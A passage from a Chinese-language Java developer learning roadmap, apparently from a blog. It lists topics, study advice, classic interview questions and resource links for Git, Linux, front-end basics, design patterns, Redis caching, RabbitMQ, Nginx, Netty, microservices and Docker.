href="https://www.bilibili.com/video/BV1Ds411E76Y">https://www.bilibili.com/video/BV1Ds411E76Y</a></p></li><li><p>Maven 零基础入门教程：<a href="https://www.bilibili.com/video/BV1TW411g7hP">https://www.bilibili.com/video/BV1TW411g7hP</a> （搞不懂 Maven 可以看看）</p></li><li><p>⭐ 雷丰阳 2021 版 SpringBoot2 零基础入门：<a href="https://www.bilibili.com/video/BV19K4y1L7MT">https://www.bilibili.com/video/BV19K4y1L7MT</a></p></li><li><p>尚硅谷 - SpringSecurity 框架教程：<a href="https://www.bilibili.com/video/BV15a411A7kP">https://www.bilibili.com/video/BV15a411A7kP</a></p></li></ul></li></ul><h3 id="🌘-开发规范（3-天）"><a href="#🌘-开发规范（3-天）" class="headerlink" title="🌘 开发规范（3 天）"></a>🌘 开发规范（3 天）</h3><p>开发不规范，同事两行泪。</p><p>开发规范是团队开发中必须遵守的，有利于提高项目的开发效率、降低维护成本。</p><h4 id="知识-8"><a href="#知识-8" class="headerlink" title="知识"></a>知识</h4><ul><li>代码规范<ul><li>代码风格</li><li>命名</li><li>其他规则</li></ul></li><li>代码校验（CheckStyle）</li><li>提交规范</li></ul><h4 id="学习建议-9"><a href="#学习建议-9" class="headerlink" title="学习建议"></a>学习建议</h4><p>有时间的话，简单过一遍大厂团队的代码规范手册就好了，以后做项目的时候能想起来的话就去使用，或者从书中、网上查规范文档，再去遵守。</p><p>项目做得多了，自然会养成好的习惯，不用刻意去记（毕竟每个团队规范也不完全相同，背了也没用）。也可以直接利用开发工具自带的一些代码检查插件，帮忙养成好的编码习惯。</p><h4 id="资源-9"><a href="#资源-9" class="headerlink" title="资源"></a>资源</h4><ul><li><p>书籍</p><ul><li>⭐ 阿里巴巴 Java 开发手册：<a href="https://developer.aliyun.com/graph/java">https://developer.aliyun.com/graph/java</a> （搜索《Java开发手册》）</li></ul></li><li><p>视频</p><ul><li>华山版《Java开发手册》独家讲解：<a href="https://developer.aliyun.com/live/1201">https://developer.aliyun.com/live/1201</a></li></ul></li><li><p>文档</p><ul><li>Google Java Style Guide：<a href="https://google.github.io/styleguide/javaguide.html">https://google.github.io/styleguide/javaguide.html</a> （谷歌 Java 代码规范）</li></ul></li></ul><h3 id="🌕-Git（3-天）"><a href="#🌕-Git（3-天）" class="headerlink" title="🌕 Git（3 天）"></a>🌕 Git（3 天）</h3><p>此前大家可能听说过 GitHub，一流的代码开源托管平台。</p><p>Git 和它可不一样，是一个版本控制工具，可以更好地管理和共享项目代码，比如把自己的代码传到 GitHub 上、或者从远程下载。</p><p>无论自己做项目、还是团队开发，Git 都是现在不可或缺的神器。</p><h4 id="知识-9"><a href="#知识-9" class="headerlink" title="知识"></a>知识</h4><ul><li>区分 Git 和 GitHub</li><li>工作区</li><li>分支</li><li>代码提交、推送、拉取、回退、重置</li><li>分支操作</li><li>代码合并、解决冲突</li><li>标签</li><li>cherry-pick</li><li>Git Flow</li><li>相关技术：SVN（比较老）</li></ul><h4 id="学习建议-10"><a href="#学习建议-10" class="headerlink" title="学习建议"></a>学习建议</h4><p>每个命令跟着敲一遍，有个大致的印象，会用即可。</p><p>建议平时大家可以多把自己的代码使用 Git 命令上传到 GitHub 上，用的多了自然就熟悉了。</p><h4 id="经典面试题-7"><a href="#经典面试题-7" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>如何解决提交冲突？</li><li>提交不小心出现误操作，如何撤销？</li><li>什么是 Git Flow，它有什么好处？</li></ol><h4 id="资源-10"><a href="#资源-10" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>⭐【尚硅谷】5h打通Git全套教程丨2021最新IDEA版 <a href="https://www.bilibili.com/video/BV1vy4y1s7k6">https://www.bilibili.com/video/BV1vy4y1s7k6</a></li></ul></li><li><p>书籍</p><ul><li>猴子都能懂的 Git 入门 <a href="https://backlog.com/git-tutorial/cn/">https://backlog.com/git-tutorial/cn/</a></li><li>⭐ GitHub 漫游指南 <a href="https://github.phodal.com/">https://github.phodal.com/</a></li></ul></li><li><p>文档</p><ul><li>GitHub 官方文档：<a href="https://docs.github.com/cn">https://docs.github.com/cn</a></li></ul></li><li><p>游戏</p><ul><li>Learning Git Branching：<a href="https://learngitbranching.js.org/?locale=zh_CN">https://learngitbranching.js.org/?locale=zh_CN</a></li></ul></li></ul><h3 id="🌖-Linux（10-天）"><a href="#🌖-Linux（10-天）" class="headerlink" title="🌖 Linux（10 天）"></a>🌖 Linux（10 天）</h3><p>企业中的很多前后台项目都是部署在 Linux 服务器上的，因此很有必要熟悉 Linux 的操作和脚本的编写。</p><p>后面学微服务、学架构都是在多台服务器操作，如果你不熟悉 Linux，会有点吃力。</p><h4 id="知识-10"><a href="#知识-10" class="headerlink" title="知识"></a>知识</h4><ul><li>Linux 系统安装</li><li>环境变量</li><li>文件管理</li><li>用户管理</li><li>内存管理</li><li>磁盘管理</li><li>进程管理</li><li>网络管理</li><li>软件包管理</li><li>服务管理</li><li>日志管理</li><li>Linux 内核</li><li><strong>常用命令</strong></li><li><strong>常用环境搭建</strong></li><li><strong>Shell 脚本编程</strong></li><li><strong>VIM 的使用</strong></li></ul><h4 id="学习建议-11"><a href="#学习建议-11" class="headerlink" title="学习建议"></a>学习建议</h4><p>多动手实践，建议自己购买一台云服务器，并且在本地搭建 Linux 虚拟机环境。</p><p>一定要自己从 0 开始手敲命令安装软件、部署服务，熟悉整个项目的上线流程。</p><p>每个命令至少要跟着敲一遍，了解它们的作用，并通过自然地练习，熟悉常用的 Linux 命令。</p><p>记不住没关系，用文档查就行了。</p><p>先会用，再理解。一般面试问的 Linux 题目也不会很难，面试前去背一下八股文就没什么问题，感兴趣的话可以去看看 Linux 内核设计。</p><h4 id="经典面试题-8"><a href="#经典面试题-8" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>如何查看某个进程的运行状态？</li><li>如何在 Linux 上查看 2 G 的大文件？</li><li>Linux 软链接和硬链接的区别</li></ol><h4 id="资源-11"><a href="#资源-11" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>⭐ 2021 韩顺平 一周学会Linux <a href="https://www.bilibili.com/video/BV1Sv411r7vd">https://www.bilibili.com/video/BV1Sv411r7vd</a> （基于 CentOS 7.6 版本较新）</li></ul></li><li><p>书籍</p><ul><li>《鸟哥的 Linux 私房菜 —— 基础篇》<a href="http://cn.linux.vbird.org/linux_basic/linux_basic.php">http://cn.linux.vbird.org/linux_basic/linux_basic.php</a> （经典）</li></ul></li><li><p>文档</p><ul><li>Linux 工具快速教程：<a href="https://linuxtools-rst.readthedocs.io/">https://linuxtools-rst.readthedocs.io</a> （基础、工具进阶、工具参考）</li></ul></li><li><p>实战</p><ul><li>⭐ 蓝桥云课 Linux 基础入门：<a href="https://www.lanqiao.cn/courses/1">https://www.lanqiao.cn/courses/1</a></li><li>腾讯云动手实验室：<a href="https://cloud.tencent.com/developer/labs">https://cloud.tencent.com/developer/labs</a></li><li>阿里云体验实验室：<a href="https://developer.aliyun.com/adc/labs/">https://developer.aliyun.com/adc/labs/</a></li><li>阿里云知行实验室：<a href="https://start.aliyun.com/">https://start.aliyun.com/</a></li><li>华为云沙箱实验室：<a href="https://lab.huaweicloud.com/">https://lab.huaweicloud.com/</a></li></ul></li><li><p>社区</p><ul><li>Linux 中国：<a href="https://linux.cn/">https://linux.cn/</a></li></ul></li><li><p>工具</p><ul><li>⭐ Linux 命令搜索：<a href="https://wangchujiang.com/linux-command">https://wangchujiang.com/linux-command</a></li><li>Linux 命令大全手册：<a href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></li><li>Linux 命令示例：<a href="http://linux-commands-examples.com/">http://linux-commands-examples.com/</a></li><li>宝塔 Linux 面板：<a href="https://www.bt.cn/">https://www.bt.cn/</a></li></ul></li></ul><h3 id="🌘-前端基础（14-天）"><a href="#🌘-前端基础（14-天）" class="headerlink" title="🌘 前端基础（14 天）"></a>🌘 前端基础（14 天）</h3><p>虽然 Java 程序员面试时基本不会出现前端相关问题，但是在企业中，往往需要前后端程序员配合完成工作。会一些前端，不仅可以提高你们的协作效率，还能提高自己对整个项目的了解和掌控力，甚至能独立开发出一个完整项目！这点也是能给面试加分的。</p><h4 id="知识-11"><a href="#知识-11" class="headerlink" title="知识"></a>知识</h4><ul><li>HTML</li><li>CSS</li><li>JavaScript<ul><li>Ajax</li></ul></li><li>Vue</li></ul><h4 id="学习建议-12"><a href="#学习建议-12" class="headerlink" title="学习建议"></a>学习建议</h4><p>不需要学习太多的前端技术，熟悉下基础的前端三件套，了解前端是如何向后端发送请求来做数据交互的一般就够了。有时间的话可以学下 Vue ，是比较容易上手的主流前端开发框架，Vue + SpringBoot 还是很香的。</p><h4 id="资源-12"><a href="#资源-12" class="headerlink" title="资源"></a>资源</h4><p>参见鱼皮原创的前端学习路线：<a href="https://mp.weixin.qq.com/s/HbzLEt6NOP9Is9F3GOnbUQ">https://mp.weixin.qq.com/s/HbzLEt6NOP9Is9F3GOnbUQ</a></p><h3 id="练手项目-1"><a href="#练手项目-1" class="headerlink" title="练手项目"></a>练手项目</h3><blockquote><p>更多请见本路线阶段 5：[项目源码（50 套）](###项目源码（50 套）) 。</p></blockquote><ul><li>HotelSystem：<a href="https://github.com/misterchaos/HotelSystem">https://github.com/misterchaos/HotelSystem</a> （酒店管理系统 Java,tomcat,mysql,servlet,jsp实现，没有使用任何框架）</li><li>超市管理系统：<a href="https://github.com/zhanglei-workspace/shopping-management-system">https://github.com/zhanglei-workspace/shopping-management-system</a></li><li>Mall4j：<a href="https://github.com/gz-yami/mall4j">https://github.com/gz-yami/mall4j</a> （Spring Boot 电商系统）</li><li>newbee-mall：<a href="https://github.com/newbee-ltd/newbee-mall">https://github.com/newbee-ltd/newbee-mall</a> （基于 Spring Boot 2.X 的全栈电商系统）</li><li>litemall：<a href="https://github.com/linlinjava/litemall">https://github.com/linlinjava/litemall</a> （小商城系统，Spring Boot 后端 + Vue 管理员前端 + 微信小程序用户前端 + Vue 用户移动端）</li><li>forum-java：<a href="https://github.com/Qbian61/forum-java">https://github.com/Qbian61/forum-java</a> （一款用 Java Spring Boot 实现的现代化社区系统）</li></ul><h3 id="尾声-2"><a href="#尾声-2" class="headerlink" title="尾声"></a>尾声</h3><p>学完这个阶段的知识后，一定要再串起来回忆一遍，必须自己独立开发一个 Java Web 项目（量级可以不大，但你学过的技术尽可能地用上），能发布到 Linux 服务器上让其他小伙伴访问就更好了~</p><p>如果你只是对 Java 感兴趣、或者只是想试着自己开发后台，并不是想靠 Java 找工作的话，学到这里就可以了。可以把更多时间投入到你主方向的学习中。</p><p>但如果你是想找 Java 方向的工作，尤其是想进大厂的话，一定要继续努力，用心学习下个阶段的企业开发进阶知识。</p><h2 id="阶段-4：Java-企业开发进阶"><a href="#阶段-4：Java-企业开发进阶" class="headerlink" title="阶段 4：Java 企业开发进阶"></a>阶段 4：Java 企业开发进阶</h2><h3 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a>目标</h3><p>学习更多企业级开发技术和编程思想，能够结合多种技术，独立开发出架构合理的完整系统，<strong>解决实际问题</strong> 。</p><p>要了解为什么需要这个技术？什么时候用这个技术？某个需求该用哪些技术？</p><p>当然，这个阶段的内容有些过于丰富，不是所有的东西都要学，大家可以根据自己的实际情况（时间），有选择地学习。</p><h3 id="🌘-软件工程"><a href="#🌘-软件工程" class="headerlink" title="🌘 软件工程"></a>🌘 软件工程</h3><p>软件开发和管理的一些概念、原则、技术、方法、工具和经验。</p><h4 id="知识-12"><a href="#知识-12" class="headerlink" title="知识"></a>知识</h4><ul><li>软件的本质</li><li>软件特性</li><li>软件过程</li><li>软件开发原则<ul><li>开闭原则</li><li>里氏替换原则</li><li>依赖倒置原则</li><li>单一职责原则</li><li>接口隔离原则</li><li>迪米特法则</li></ul></li><li>软件过程模型</li><li>敏捷开发</li><li>软件开发模型</li><li>需求建模</li><li>软件设计</li><li>UML</li><li>体系结构设计</li><li>设计模式</li><li>软件质量管理</li><li>评审</li><li>软件质量保证</li><li>软件测试<ul><li>单元测试</li><li>集成测试</li><li>系统测试</li><li>压力测试</li><li>部署测试</li></ul></li><li>软件配置管理</li><li>软件项目管理</li><li>软件项目估算</li><li>项目进度安排</li><li>风险管理</li><li>软件过程改进<ul><li>成熟度模型</li></ul></li></ul><h4 id="学习建议-13"><a href="#学习建议-13" class="headerlink" title="学习建议"></a>学习建议</h4><p>大学软件专业的必修课，偏理论，能学到很多企业软件开发的方法，也是对软件开发同学综合能力的提升，有时间的话可以了解下。但对想要快速找工作的同学来说，忽略即可，面试基本不会问。</p><h4 id="资源-13"><a href="#资源-13" class="headerlink" title="资源"></a>资源</h4><ul><li><p>书籍</p><ul><li>《软件工程：实践者的研究方法》：<a href="https://book.douban.com/subject/6047742/">https://book.douban.com/subject/6047742/</a> （经典大黑书，讲的非常全面，但同样完整读下来还是有些难度的）</li><li>《软件开发的 201 个原则》：<a href="https://book.douban.com/subject/35628886/">https://book.douban.com/subject/35628886/</a> （工具书，看一遍挺好的）</li></ul></li><li><p>视频</p><ul><li>清华大学软件工程：<a href="https://www.bilibili.com/video/BV1eE411V7Cr">https://www.bilibili.com/video/BV1eE411V7Cr</a></li><li>北京大学软件工程：<a href="https://www.bilibili.com/video/BV1Vt411V72G">https://www.bilibili.com/video/BV1Vt411V72G</a></li><li>大连工业大学软件工程：<a href="https://www.bilibili.com/video/BV1Ns41177VM">https://www.bilibili.com/video/BV1Ns41177VM</a></li></ul></li><li><p>大学课件</p><ul><li>浙大计算机软件工程：<a href="https://github.com/QSCTech/zju-icicles">https://github.com/QSCTech/zju-icicles</a></li></ul></li></ul><h3 id="🌖-设计模式（21-天）"><a href="#🌖-设计模式（21-天）" class="headerlink" title="🌖 设计模式（21 天）"></a>🌖 设计模式（21 天）</h3><p>设计模式是软件开发中解决一类问题的通用方法。</p><p>使用设计模式能让你写出更优雅、可维护的代码，也正因如此，很多框架源码都用到了设计模式，你不学很难看懂。</p><h4 id="知识-13"><a href="#知识-13" class="headerlink" title="知识"></a>知识</h4><ul><li><p>创建型模式：对象实例化的模式，创建型模式用于解耦对象的实例化过程</p><ul><li>单例模式</li><li>工厂方法模式</li><li>抽象工厂</li><li>建造者模式</li><li>原型模式</li></ul></li><li><p>结构型模式：把类或对象结合在一起形成一个更大的结构</p><ul><li>适配器模式</li><li>组合模式</li><li>装饰器模式</li><li>代理模式</li><li>享元模式</li><li>外观模式</li><li>桥接模式</li></ul></li><li><p>行为型模式：类和对象如何交互，及划分责任和算法</p><ul><li>迭代器模式</li><li>模板方法模式</li><li>策略模式</li><li>命令模式</li><li>状态模式</li><li>责任链模式</li><li>备忘录模式</li><li>观察者模式</li><li>访问者模式</li><li>中介者模式</li><li>解释器模式</li></ul></li></ul><h4 id="学习建议-14"><a href="#学习建议-14" class="headerlink" title="学习建议"></a>学习建议</h4><p>先理解概念，了解每个设计模式的特点和应用场景，再多加练习，运用到实际项目。</p><h4 id="经典面试题-9"><a href="#经典面试题-9" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>单例模式有哪些实现方式？有哪些优缺点？请手写其中一种</li><li>你用过哪些设计模式，为什么用它？</li></ol><h4 id="资源-14"><a href="#资源-14" class="headerlink" title="资源"></a>资源</h4><ul><li><p>书籍</p><ul><li>⭐《图解设计模式》（强烈推荐这本书，正是用 Java 语言实现，图多、有示例代码、有习题和答案，很不错）</li><li>《Head First 设计模式》</li><li>《大话设计模式》</li><li>《设计模式：可复用面向对象软件的基础》（大黑书，有能力的话也可以去读）</li></ul></li><li><p>视频</p><ul><li>尚硅谷图解 Java 设计模式：<a href="https://www.bilibili.com/video/BV1G4411c7N4">https://www.bilibili.com/video/BV1G4411c7N4</a></li></ul></li><li><p>文档</p><ul><li>菜鸟教程：<a href="https://www.runoob.com/design-pattern/design-pattern-tutorial.html">https://www.runoob.com/design-pattern/design-pattern-tutorial.html</a></li><li>图说设计模式：<a href="https://design-patterns.readthedocs.io/zh_CN/latest/">https://design-patterns.readthedocs.io/zh_CN/latest/</a></li></ul></li></ul><h3 id="🌕-缓存（14-天）"><a href="#🌕-缓存（14-天）" class="headerlink" title="🌕 缓存（14 天）"></a>🌕 缓存（14 天）</h3><p>缓存是高并发系统不可或缺的技术，可以提高系统的性能和并发，因此是后台开发必学的知识点，也是面试重点。</p><h4 id="知识-14"><a href="#知识-14" class="headerlink" title="知识"></a>知识</h4><ul><li>什么是缓存？</li><li>本地缓存<ul><li>Caffeine 库</li></ul></li><li>多级缓存</li><li>Redis 分布式缓存<ul><li>数据类型</li><li>常用操作</li><li>Java 操作 Redis<ul><li>Spring Boot Redis Template</li><li>Redisson</li></ul></li><li>主从模型搭建</li><li>哨兵集群搭建</li><li>日志持久化</li></ul></li><li>缓存（Redis）应用场景<ul><li>数据共享</li><li>单点登录</li><li>计数器</li><li>限流</li><li>点赞</li><li>实时排行榜</li><li>分布式锁</li></ul></li><li>缓存常见问题<ul><li>缓存雪崩</li><li>缓存击穿</li><li>缓存穿透</li><li>缓存更新一致性</li></ul></li><li>相关技术：Memcached、Ehcache</li></ul><h4 id="学习建议-15"><a href="#学习建议-15" class="headerlink" title="学习建议"></a>学习建议</h4><p>学会如何简单地使用缓存并不难，和数据库类似，无非就是调用 API 对数据进行增删改查。</p><p>因此，建议先能够独立使用它，了解缓存的应用场景；再学习如何在 Java 中操作缓存中间件，并尝试和项目相结合，提高系统的性能。</p><p>跟着视频教程实操一遍即可，可以等到面试前再去深入了解原理和高级特性。</p><h4 id="经典面试题-10"><a href="#经典面试题-10" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>Redis 为什么快？</li><li>Redis 有哪些常用的数据结构？</li><li>Redis RDB 和 AOF 持久化的区别，如何选择？</li><li>如何解决缓存击穿、缓存穿透、雪崩问题？</li><li>如何用 Redis 实现点赞功能，怎么设计 Key &#x2F; Value？</li></ol><h4 id="资源-15"><a href="#资源-15" class="headerlink" title="资源"></a>资源</h4><ul><li>视频<ul><li>⭐ 尚硅谷 - 2021 最新 Redis 6 入门到精通教程：<a href="https://www.bilibili.com/video/BV1Rv41177Af">https://www.bilibili.com/video/BV1Rv41177Af</a> （基于 Redis 6 的，推荐）</li></ul></li><li>文档<ul><li>Redis 命令参考：<a href="http://redisdoc.com/">http://redisdoc.com/</a></li><li>Redis 面试题整理：<a href="https://github.com/lokles/Web-Development-Interview-With-Java/blob/main/Redis%E9%97%AE%E9%A2%98.md">https://github.com/lokles/Web-Development-Interview-With-Java/blob/main/Redis%E9%97%AE%E9%A2%98.md</a></li></ul></li><li>书籍<ul><li>《Redis 实战》（经典）</li></ul></li><li>工具<ul><li>⭐ Redis 在线练习：<a href="https://try.redis.io/">https://try.redis.io/</a> （强烈推荐）</li></ul></li></ul><h3 id="🌖-消息队列（14-天）"><a href="#🌖-消息队列（14-天）" class="headerlink" title="🌖 消息队列（14 天）"></a>🌖 消息队列（14 天）</h3><p>消息队列是用于传输和保存消息的容器，也是大型分布式系统中常用的技术，主要解决应用耦合、异步消息、流量削锋等问题。后台开发必学，也是面试重点。</p><h4 id="知识-15"><a href="#知识-15" class="headerlink" title="知识"></a>知识</h4><ul><li>消息队列的作用</li><li>RabbitMQ 消息队列<ul><li>生产消费模型</li><li>交换机模型</li><li>死信队列</li><li>延迟队列</li><li>消息持久化</li><li>Java 操作</li><li>集群搭建</li></ul></li><li>相关技术：Kafka、ActiveMQ、TubeMQ、RocketMQ</li></ul><h4 id="学习建议-16"><a href="#学习建议-16" class="headerlink" title="学习建议"></a>学习建议</h4><p>和缓存一样，学会如何使用消息队列并不难，无非就是调用 API 去生产、转发和消费消息。</p><p>因此，建议先能够独立使用它，了解消息队列的应用场景；再学习如何在 Java 中操作消息队列中间件，并尝试和项目相结合，感受消息队列带来的好处。</p><p>这里我建议初学者先学习 RabbitMQ，比 Kafka 要好理解一些。跟着视频教程实操一遍即可，可以等到面试前再去深入了解原理和高级特性。</p><h4 id="经典面试题-11"><a href="#经典面试题-11" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>使用消息队列有哪些优缺点？</li><li>如何保证消息消费的幂等性？</li><li>消息队列有哪些路由模型？</li><li>你是否用过消息队列，解决过什么问题？</li></ol><h4 id="资源-16"><a href="#资源-16" class="headerlink" title="资源"></a>资源</h4><ul><li>视频<ul><li>⭐ 尚硅谷 - 2021 最新 RabbitMQ 教程：<a href="https://www.bilibili.com/video/BV1cb4y1o7zz">https://www.bilibili.com/video/BV1cb4y1o7zz</a> （很新很全面）</li></ul></li><li>文档<ul><li>RabbitMQ 中文文档：<a href="http://rabbitmq.mr-ping.com/">http://rabbitmq.mr-ping.com/</a></li></ul></li><li>书籍<ul><li>《RabbitMQ 实战：高效部署分布式消息队列》（经典）</li></ul></li><li>工具<ul><li>⭐ RabbitMQ 在线模拟器：<a href="http://tryrabbitmq.com/">http://tryrabbitmq.com/</a></li></ul></li></ul><h3 id="🌖-Nginx（14-天）"><a href="#🌖-Nginx（14-天）" class="headerlink" title="🌖 Nginx（14 天）"></a>🌖 Nginx（14 天）</h3><p>Nginx 是主流的、开源的、高性能的 HTTP 和反向代理 web 服务器，可以用于挂载网站、请求转发、负载均衡、网关路由等。前后端开发同学都需要学习，在后端开发的面试中有时会考到。</p><h4 id="知识-16"><a href="#知识-16" class="headerlink" title="知识"></a>知识</h4><ul><li>Nginx 作用</li><li>正向代理</li><li>反向代理（负载均衡）</li><li>常用命令</li><li>配置</li><li>动静分离（网站部署）</li><li>集群搭建</li><li>相关技术：HAProxy、Apache</li></ul><h4 id="学习建议-17"><a href="#学习建议-17" class="headerlink" title="学习建议"></a>学习建议</h4><p>Nginx 的基本使用非常简单，甚至不需要看任何的视频，跟着一篇文章就能够用它来提供网站访问能力、实现反向代理。</p><p>但是在企业中，Nginx 的使用往往没那么简单，作为负载均衡、请求转发的重要组件，往往需要针对实际场景去写一些特定的配置。因此建议有时间的话，实践下 Nginx 的配置方法，了解 Nginx 基本的设计思想，对今后自己设计系统时也有帮助。</p><h4 id="经典面试题-12"><a href="#经典面试题-12" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>Nginx 有哪些作用？</li><li>Nginx 为什么支持高并发？</li><li>Nginx 有哪些负载均衡策略？</li><li>什么是 Nginx 惊群问题，如何解决它？</li></ol><h4 id="资源-17"><a href="#资源-17" class="headerlink" title="资源"></a>资源</h4><ul><li>视频<ul><li>⭐ 尚硅谷 - Nginx 教程由浅入深：<a href="https://www.bilibili.com/video/BV1zJ411w7SV">https://www.bilibili.com/video/BV1zJ411w7SV</a> （讲的比较全面）</li><li>⭐ Nginx 鱼皮 - 手把手带你从0搭建个人网站：<a href="https://www.bilibili.com/video/BV1rU4y1J785/">https://www.bilibili.com/video/BV1rU4y1J785/</a> （简单演示 Nginx 部署网站）</li></ul></li><li>文档<ul><li>Nginx 中文文档：<a href="https://www.nginx.cn/doc/index.html">https://www.nginx.cn/doc/index.html</a></li></ul></li><li>工具<ul><li>Nginx 配置在线生成：<a href="https://www.digitalocean.com/community/tools/nginx?global.app.lang=zhCN">https://www.digitalocean.com/community/tools/nginx?global.app.lang=zhCN</a></li></ul></li></ul><h3 id="🌗-Netty-网络编程（21-天）"><a href="#🌗-Netty-网络编程（21-天）" class="headerlink" title="🌗 Netty 网络编程（21 天）"></a>🌗 Netty 网络编程（21 天）</h3><p>开源的 Java 网络编程框架，用于开发高性能（事件驱动、异步非阻塞）、高可靠的网络服务器和客户端程序。</p><p>很多网络框架和服务器程序都用到了 Netty 作为底层，学好 Netty 不仅可以让我们自己实现高性能服务器，也能更好地理解其他的框架应用、阅读源码。</p><h4 id="知识-17"><a href="#知识-17" class="headerlink" title="知识"></a>知识</h4><ul><li>IO 模型（BIO &#x2F; NIO）</li><li>Channel</li><li>Buffer</li><li>Seletor</li><li>Netty 模型</li><li>WebSocket 编程（动手做个聊天室）</li><li>相关技术：Vertx（中文文档：<a href="http://vertxchina.github.io/vertx-translation-chinese/">http://vertxchina.github.io/vertx-translation-chinese/</a> ，比 Netty 简单多了，实在看不懂 Netty 也可以学习下这个）</li></ul><h4 id="学习建议-18"><a href="#学习建议-18" class="headerlink" title="学习建议"></a>学习建议</h4><p>不同于之前学的 SSM 框架，Netty 还是需要一定学习成本的，一方面是国内资源太缺乏，另一方面很多重要的概念（比如 NIO）还是要多动手写代码调试才能理解。</p><p>还是建议先从视频入门，并且不建议在 Netty 上花太多时间，面试的时候一般也就考察一些 Netty 背后的思想（比如 NIO）而非框架本身的语法细节。</p><h4 id="经典面试题-13"><a href="#经典面试题-13" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>Netty 有哪些优点？</li><li>什么是 NIO？</li><li>介绍 Netty 的零拷贝机制</li></ol><h4 id="资源-18"><a href="#资源-18" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li><p>⭐ 尚硅谷Netty教程：<a href="https://www.bilibili.com/video/BV1DJ411m7NR">https://www.bilibili.com/video/BV1DJ411m7NR</a></p></li><li><p>Netty 技术演讲（中文字幕版）：<a href="https://www.youtube.com/watch?v=I8yy2Cy7dDI">https://www.youtube.com/watch?v=I8yy2Cy7dDI</a></p></li></ul></li><li><p>文档</p><ul><li>Netty 4 用户指南：<a href="https://www.w3cschool.cn/netty_4_user_guide/">https://www.w3cschool.cn/netty_4_user_guide/</a></li></ul></li><li><p>书籍</p><ul><li>《Netty 实战》</li></ul></li></ul><h3 id="🌖-微服务（60-天）"><a href="#🌖-微服务（60-天）" class="headerlink" title="🌖 微服务（60 天）"></a>🌖 微服务（60 天）</h3><p>随着互联网的发展，项目越来越复杂，单机且庞大的巨石项目已无法满足开发、运维、并发、可靠性等需求。</p><p>因此，后台架构不断演进，可以将庞大的项目拆分成一个个职责明确、功能独立的细小模块，模块可以部署在多台服务器上，相互配合协作，提供完整的系统能力。</p><p>换言之，想做大型项目，这块儿一定要好好学！</p><h4 id="知识-18"><a href="#知识-18" class="headerlink" title="知识"></a>知识</h4><h5 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h5><ul><li>架构演进</li><li>RPC</li><li>Zookeeper</li><li>服务提供者</li><li>服务消费者</li><li>项目搭建</li><li>相关技术：DubboX（对 Dubbo 的扩展）</li></ul><h5 id="🌖-微服务"><a href="#🌖-微服务" class="headerlink" title="🌖 微服务"></a>🌖 微服务</h5><ul><li>微服务概念</li><li>Spring Cloud 框架<ul><li>子父工程</li><li>服务注册与发现</li><li>注册中心 Eureka、Zookeeper、Consul</li><li>Ribbon 负载均衡</li><li>Feign 服务调用</li><li>Hystrix 服务限流、降级、熔断</li><li>Resilience4j 服务容错</li><li>Gateway（Zuul）微服务网关</li><li>Config 分布式配置中心</li><li>分布式服务总线</li><li>Sleuth + Zipkin 分布式链路追踪</li></ul></li><li>Spring Cloud Alibaba<ul><li>Nacos 注册、配置中心</li><li>OpenFeign 服务调用</li><li>Sentinel 流控</li><li>Seata 分布式事务</li></ul></li></ul><h5 id="接口管理"><a href="#接口管理" class="headerlink" title="接口管理"></a>接口管理</h5><ul><li>Swagger 接口文档</li><li>Postman 接口测试</li><li>相关技术：YApi、ShowDoc</li></ul><h4 id="学习建议-19"><a href="#学习建议-19" class="headerlink" title="学习建议"></a>学习建议</h4><p>时间不急的话，建议先从 Dubbo 学起，对分布式、RPC、微服务有些基本的了解，再去食用 Spring Cloud 全家桶会更香。学完 Spring Cloud 全家桶后，再去学 Spring Cloud Alibaba 就很简单了。</p><p>这部分内容的学习，原理 + 实践都很重要，也不要被各种高大上的词汇唬住了，都是上层（应用层）的东西，基本没有什么算法，跟着视频教程学，其实还是很好理解的。</p><p>分布式相关知识非常多，但这里不用刻意去背，先通过视频教程实战使用一些微服务框架，也能对其中的概念有基本的了解。</p><p>大厂面试的时候很少问 Spring Cloud 框架的细节，更多的是微服务以及各组件的一些思想，比如网关的好处、消息总线的好处等。</p><h4 id="经典面试题-14"><a href="#经典面试题-14" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>什么是微服务，有哪些优缺点？</li><li>什么是注册中心，能解决什么问题？</li></ol><h4 id="资源-19"><a href="#资源-19" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li><p>⭐ 尚硅谷 Dubbo 教程：<a href="https://www.bilibili.com/video/BV1ns411c7jV">https://www.bilibili.com/video/BV1ns411c7jV</a></p></li><li><p>⭐ 尚硅谷 SpringCloud（H版&amp;alibaba）框架开发教程（微服务分布式架构）：<a href="https://www.bilibili.com/video/BV18E411x7eT">https://www.bilibili.com/video/BV18E411x7eT</a> （把国外的 Spring Cloud 和国内的 Spring Cloud Alibaba 结合在一起对比着去讲，主流技术栈、知识点都讲到了，真心不错！）</p></li></ul></li><li><p>文档</p><ul><li>Apache Dubbo 官方文档：<a href="https://dubbo.apache.org/zh/">https://dubbo.apache.org/zh/</a></li><li>Spring Cloud Alibaba 官方文档：<a href="https://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md">https://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md</a></li><li>⭐ Swagger 教学文档：<a href="https://doc.xiaominfo.com/">https://doc.xiaominfo.com/</a> （跟着快速开始直接用就好了）</li></ul></li></ul><h3 id="🌖-容器（7-天）"><a href="#🌖-容器（7-天）" class="headerlink" title="🌖 容器（7 天）"></a>🌖 容器（7 天）</h3><p>将应用和环境进行封装，相互隔离、独立部署、便于移植，提高安全性、提高开发和维护效率。</p><p>便于实现微服务、持续集成和交付。</p><h4 id="知识-19"><a href="#知识-19" class="headerlink" title="知识"></a>知识</h4><ul><li>🌖 Docker<ul><li>容器概念</li><li>镜像</li><li>部署服务</li><li>Dockerfile</li><li>Docker Compose</li><li>Docker Machine</li><li>Docker 